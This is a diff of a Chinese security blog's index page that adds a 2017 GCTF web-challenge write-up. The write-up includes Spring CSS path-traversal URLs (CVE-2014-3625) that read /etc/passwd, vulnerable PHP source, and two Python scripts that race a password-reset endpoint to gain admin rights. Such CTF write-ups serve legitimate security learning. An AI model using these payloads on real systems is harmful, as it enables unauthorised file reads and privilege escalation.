@@ -452,6 +452,193 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/19/GCTF-web-writeup/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="chybeta">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Chybeta">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/06/19/GCTF-web-writeup/" itemprop="url">
+                  GCTF-web-writeup
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-06-19T08:11:03+08:00">
+                2017-06-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/06/19/GCTF-web-writeup/" class="leancloud_visitors" data-flag-title="GCTF-web-writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="热身题"><a href="#热身题" class="headerlink" title="热身题"></a>热身题</h1><p>题目地址：<a href="http://218.2.197.232:18001/" target="_blank" rel="external">http://218.2.197.232:18001/</a><br>访问robots.txt。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18001/robots.txt</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/3.jpg?raw=true" alt=""></p>
+<p>一个个访问过去：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18001/rob0t.php</div></pre></td></tr></table></figure></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;ae609880185f1d75&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="springcss"><a href="#springcss" class="headerlink" title="springcss"></a>springcss</h1><p>springcss-cve-2014-3625漏洞。github上有利用脚本:<a href="https://github.com/ilmila/springcss-cve-2014-3625/blob/master/stealfile.sh" target="_blank" rel="external">https://github.com/ilmila/springcss-cve-2014-3625/blob/master/stealfile.sh</a> 。<br>这里的payload1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18015/spring-css/resources/file:/etc/passwd</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/1.jpg?raw=true" alt=""></p>
+<p>payload2：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.2.197.232:18015/spring-css/resources/file:/etc/flag</div></pre></td></tr></table></figure></p>
+<p>最后flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">GCTF&#123;db839442402f5874&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="PHP序列化"><a href="#PHP序列化" class="headerlink" title="PHP序列化"></a>PHP序列化</h1><p>题目地址：<a href="http://218.2.197.232:18017/" target="_blank" rel="external">http://218.2.197.232:18017/</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/2.jpg?raw=true" alt=""></p>
+<p>题目给了源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">//error_reporting(E_ERROR &amp; ~E_NOTICE);</span></div><div class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</div><div class="line">header(<span class="string">"content-type;text/html;charset=utf-8"</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))&#123;</div><div class="line">    $_SESSION[<span class="string">'src'</span>] = $_GET[<span class="string">'src'</span>];</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div><div class="line">    print_r($_SESSION[<span class="string">'src'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>里面提到了session.serialize_handler，想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》</p>
+<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>题目地址：<a href="http://218.2.197.242:18009/" target="_blank" rel="external">http://218.2.197.242:18009/</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/4.jpg?raw=true" alt=""></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Content-type: text/html; charset=utf-8"</span>);</div><div class="line">session_start();</div><div class="line"></div><div class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"root"</span>, <span class="string">""</span>, <span class="string">"gctf09"</span>);</div><div class="line"><span class="keyword">if</span> ($mysqli-&gt;connect_errno) &#123;</div><div class="line">   <span class="keyword">die</span>(<span class="string">"数据库连接错误，多次出现请联系管理员。"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//打印源码</span></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'showcode'</span>]))&#123;</div><div class="line">   highlight_file(___FILE___);</div><div class="line">   <span class="keyword">exit</span>();</div><div class="line"></div><div class="line">&#125;</div><div class="line">$user=<span class="string">""</span>;</div><div class="line"><span class="comment">// 初次访问生成用户</span></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">"name"</span>]))&#123;</div><div class="line">   $user=substr(md5(uniqid().uniqid()),<span class="number">8</span>,<span class="number">16</span>);</div><div class="line">   $_SESSION[<span class="string">"name"</span>]=$user;</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"ss"</span>,$user,md5($user));</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt-&gt;close();</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt-&gt;close();</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">   $user=$_SESSION[<span class="string">"name"</span>];</div><div class="line">&#125;</div><div class="line"><span class="comment">//重置时清理用户信息</span></div><div class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>] === <span class="string">"POST"</span> &amp;&amp; $_GET[<span class="string">'method'</span>]===<span class="string">"reset"</span> &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) )&#123;</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"DELETE FROM gctf09.`user` where name=?"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"DELETE FROM gctf09.`priv` where name=?"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"ss"</span>,$user,md5($_POST[<span class="string">'password'</span>]));</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt-&gt;close();</div><div class="line">   <span class="comment">//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限</span></div><div class="line">   $stmt = $mysqli-&gt;prepare(<span class="string">"INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"</span>);</div><div class="line">   $stmt-&gt;bind_param(<span class="string">"s"</span>,$user);</div><div class="line">   $stmt-&gt;execute();</div><div class="line">   $stmt-&gt;close();</div><div class="line">   $mysqli-&gt;close();</div><div class="line">   <span class="keyword">die</span>(<span class="string">"修改成功"</span>);</div><div class="line">&#125;</div><div class="line">$mysqli-&gt;close();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>初次访问生成用户时，会往user表和priv表写入数据。</p>
+<p>而在重置用户时，进行了三个大的操作：</p>
+<ol>
+<li>删除user表中对应数据，删除priv表中对应的值。</li>
+<li>向user表中插入name和新的pass，达到更新密码的目的。</li>
+<li>向priv表中对应的name下notadmin的值更改（即插入）为”TRUE”。</li>
+</ol>
+<p>给出的源码中有一段注释：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限</div></pre></td></tr></table></figure></p>
+<p>所以在执行操作3之前，在这一个空隙里登陆的话，此时会是管理员权限。可以自己写多线程脚本，也可以用burp跑。</p>
+<p>reset.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span> :</div><div class="line">	parm = &#123;<span class="string">'name'</span>:<span class="string">'ea2a431e12ec99f7'</span>,<span class="string">'password'</span>:<span class="string">'1111'</span>&#125;</div><div class="line">	cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'p5gjc6u92u7vc3ugrjnnl86j61'</span>&#125;</div><div class="line">	r = requests.post(<span class="string">'http://218.2.197.242:18009/index.php?method=reset'</span>,cookies=cookies,data=parm)</div><div class="line">	<span class="keyword">print</span> r.text</div></pre></td></tr></table></figure></p>
+<p>login.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"></div><div class="line">flag = <span class="keyword">False</span></div><div class="line"><span class="keyword">while</span> <span class="keyword">not</span> flag:</div><div class="line">	parm = &#123;<span class="string">'name'</span>:<span class="string">'ea2a431e12ec99f7'</span>,<span class="string">'password'</span>:<span class="string">'1111'</span>&#125;</div><div class="line">	cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'p5gjc6u92u7vc3ugrjnnl86j61'</span>&#125;</div><div class="line">	r = requests.post(<span class="string">'http://218.2.197.242:18009/login.php?method=login'</span>,cookies=cookies,data=parm)</div><div class="line">	<span class="keyword">print</span> r.text</div><div class="line">	<span class="keyword">if</span> <span class="string">'&#123;'</span> <span class="keyword">in</span> r.text:</div><div class="line">		flag = <span class="keyword">True</span></div><div class="line">		<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
+<p>两者分别运行。</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170619/7.jpg?raw=true" alt=""></p>
+<h1 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h1><p>题目地址：<a href="http://218.2.197.232:18008/" target="_blank" rel="external">http://218.2.197.232:18008/</a></p>
+<h1 id="web综合"><a href="#web综合" class="headerlink" title="web综合"></a>web综合</h1><p>题目地址：<a href="http://218.2.197.232:18007/" target="_blank" rel="external">http://218.2.197.232:18007/</a></p>
+<h1 id="变态验证码"><a href="#变态验证码" class="headerlink" title="变态验证码"></a>变态验证码</h1><p>题目地址： <a href="http://218.2.197.232:18003/" target="_blank" rel="external">http://218.2.197.232:18003/</a></p>
+<h1 id="Java序列化"><a href="#Java序列化" class="headerlink" title="Java序列化"></a>Java序列化</h1><p>题目地址： <a href="http://218.2.197.232:18005/ctfobj/" target="_blank" rel="external">http://218.2.197.232:18005/ctfobj/</a></p>
+<h1 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="RCE绕过"></a>RCE绕过</h1><p>题目地址：<a href="http://218.2.197.232:18006/" target="_blank" rel="external">http://218.2.197.232:18006/</a></p>
+<h1 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h1><p>题目地址：<a href="http://218.2.197.232:18002/" target="_blank" rel="external">http://218.2.197.232:18002/</a></p>
+<h1 id="越权注入"><a href="#越权注入" class="headerlink" title="越权注入"></a>越权注入</h1><p>题目地址：<a href="http://218.2.197.232:18014/" target="_blank" rel="external">http://218.2.197.232:18014/</a></p>
+<p>　</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/18/“春秋杯”web-writeup/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1665,162 +1852,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/09/Pwnable-kr-random/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="chybeta">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/avatar.gif">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Chybeta">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/04/09/Pwnable-kr-random/" itemprop="url">
-                  Pwnable.kr:random
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-04-09T09:31:08+08:00">
-                2017-04-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/二进制安全/" itemprop="url" rel="index">
-                    <span itemprop="name">二进制安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-             <span id="/2017/04/09/Pwnable-kr-random/" class="leancloud_visitors" data-flag-title="Pwnable.kr:random">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>伪随机<br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/04/09/Pwnable-kr-random/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1868,7 +1899,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-count">38</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
